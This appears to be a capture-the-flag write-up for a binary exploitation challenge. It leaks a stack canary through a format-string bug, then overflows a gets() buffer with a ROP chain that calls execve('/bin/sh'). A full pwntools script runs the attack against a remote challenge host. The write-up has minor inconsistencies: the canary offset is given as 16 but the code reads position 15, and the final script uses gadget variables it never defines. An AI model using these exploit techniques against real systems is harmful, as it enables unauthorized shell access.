# Preliminary Reconnaissance

It seems that there are two input fields, the first one to take in up to 50 characters and the second to take in up to 6 characters. The `gets` functions used are vulnerable to buffer overflow attacks, while the `printf()` used is vulnerable to the format string bug, specifically found on line 21. Additionally, the file has NX (No eXecute) protection enabled.

Given these conditions, our approach will be:
1. **Leaking the stack canary** using the format string vulnerability.
2. **Bypassing the stack canary** and using a ROP (Return-Oriented Programming) chain to spawn a shell.

## Part 1: Beating the Canary

When two input fields exist alongside a stack canary, the first input field is typically used to leak the canary. Using the format string vulnerability, we can repeatedly print memory addresses with `%s` or `%p` to locate the canary's offset and extract its value.

If performed correctly, we find that the **canary offset is 16** (for this input field). We also need to determine the canary offset for the second input field to bypass the canary detector.

Using binary search, we find that **to bypass the canary check**, we need to input:
- **62 'A's**
- **Followed by the leaked canary value** (at position 15 in the leaked memory values)
- **Then 8 'B's** (to move from RBP to RIP)

### Exploit for Canary Extraction
```python
print(p.recv().decode())
p.sendline(b'%15$p')
print(p.recvuntil('Earth, I,').decode())
canary = int(p.recvuntil('Imaginary Technique: ').split()[0], 16)
print(canary)
payload = b'A'*62 + p64(canary) + b'B' * 8
```

## Part 2: ROP Exploit

Since there are no other exploitable functions, we assume this is a **ROP2SHELL challenge**.

### Step 1: Finding ROP Gadgets
Using **ROPgadget**, we identify key instructions required to build our payload:
```assembly
pop rax; ret --> 0x00000000004500f7
pop rdx; ret --> 0x000000000048618b  # WARNING: Assign RBX a value
mov qword ptr [rax], rdx; ret --> 0x000000000048e1f8  # WARNING: Assign RBX a value
pop rdi; ret --> 0x00000000004020af
pop rsi; ret --> 0x000000000040a11e
syscall; ret --> 0x0000000000401e64
```

### Step 2: Constructing the ROP Chain
```python
rop = b''

# Set RAX to writable memory address
rop += pop_rax
rop += p64(0x4c9000)

# Set RDX to "/bin/sh\x00"
rop += pop_rdx
rop += b'/bin/sh\x00'
rop += p64(0x0) # Assign RBX a value to avoid stack errors

# Write the string into memory at [RAX]
rop += mov_instr
rop += p64(0x0) # Assign RBX a value to avoid stack errors

# Set RAX to execve syscall number (59)
rop += pop_rax
rop += p64(0x3b)

# Set RDI to address of "/bin/sh"
rop += pop_rdi
rop += p64(0x4c9000)

# Set RDX to 0 (NULL)
rop += pop_rdx
rop += p64(0x0)
rop += p64(0x0) # Assign RBX a value

# Set RSI to 0 (NULL)
rop += pop_rsi
rop += p64(0x0)

# Trigger syscall
rop += syscall_instr
```

## Final Exploit Script
```python
from pwn import *

# Start the remote connection
p = remote('34.142.181.57', 8011)

# Extract the canary
print(p.recv().decode())
p.sendline(b'%15$p')
print(p.recvuntil('Earth, I,').decode())
canary = int(p.recvuntil('Imaginary Technique: ').split()[0], 16)
print(canary)

# Construct the payload
payload = b'A'*62 + p64(canary) + b'B' * 8

# Send the exploit
p.sendline(payload + rop)
p.interactive()
p.close()
```